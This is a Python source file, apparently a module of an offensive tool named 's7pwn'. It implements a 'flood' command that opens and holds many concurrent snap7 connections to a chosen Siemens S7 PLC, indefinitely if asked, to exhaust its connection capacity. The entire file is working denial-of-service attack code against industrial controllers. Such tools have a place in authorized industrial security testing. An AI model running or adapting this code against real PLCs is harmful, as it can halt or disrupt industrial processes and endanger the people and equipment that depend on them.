from __future__ import annotations
import threading
import time
from typing import List
import snap7
from s7pwn.runtime import get_current_target

def flood(args: List[str]) -> None:
    if len(args) < 2:
        print("Usage: flood <num_connections> <hold_seconds> [<delay>|--delay <sec>]"); return
    try:
        max_conn = int(args[0]); hold_sec = int(args[1])
    except ValueError:
        print("Invalid numbers."); return

    delay = 0.01
    if len(args) == 3 and args[2].replace(".","",1).isdigit():
        delay = float(args[2])
    if len(args) >= 4 and args[2] == "--delay":
        try: delay = float(args[3])
        except ValueError: pass

    t = get_current_target()
    if not t:
        print("No target selected. Use 'set_target' or 'select'."); return
    ip = t["ip"]
    rack = t.get("rack", 0)
    slot = t.get("slot", 1)

    print(f"[!] Starting flood to {ip} rack={rack} slot={slot} with up to {max_conn} connections.")
    clients: List[snap7.client.Client] = []
    lock = threading.Lock()
    ok = 0; fail = 0

    def worker(idx: int):
        nonlocal ok, fail
        c = snap7.client.Client()
        try:
            c.connect(ip, rack, slot)
            with lock:
                clients.append(c)
                ok += 1
            print(f"[+] Connected {idx:04d} (total={len(clients)})")
        except Exception:
            with lock:
                fail += 1
            print(f"[-] Connect {idx:04d} failed")
            try: c.destroy()
            except Exception: pass

    threads: List[threading.Thread] = []
    try:
        for i in range(max_conn):
            t = threading.Thread(target=worker, args=(i,), daemon=True)
            t.start()
            threads.append(t)
            time.sleep(delay)
        for t in threads:
            t.join(timeout=5)

        if hold_sec == 0:
            print(f"[!] Holding {len(clients)} connections indefinitely. Press Ctrl+C to stop.")
            while True:
                time.sleep(0.5)
        else:
            print(f"[!] Holding {len(clients)} connections for {hold_sec}s. Press Ctrl+C to abort earlier.")
            start = time.time()
            while time.time() - start < hold_sec:
                time.sleep(0.2)

    except KeyboardInterrupt:
        print("\n[!] Flood interrupted by user.")
    finally:
        print(f"[!] Summary: success={ok} failed={fail}. Cleaning up...")
        for c in clients:
            try: c.disconnect()
            except Exception: pass
        clients.clear()
        print("[!] Done.")
